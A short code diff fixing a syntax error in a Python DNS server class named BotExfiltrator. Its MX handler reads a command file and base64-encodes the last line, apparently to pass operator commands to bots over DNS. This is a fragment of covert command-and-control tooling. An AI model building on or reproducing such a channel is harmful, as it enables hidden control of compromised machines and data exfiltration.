@@ -61,7 +61,7 @@ class BotExfiltrator(DNSServer):
             pass
         return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
 
-    def MX(self, name)
+    def MX(self, name):
         try:
             with open(self.context['cmd']) as f:
                  cmd = base64.standard_b64encode(f.readlines()[-1][:-1])
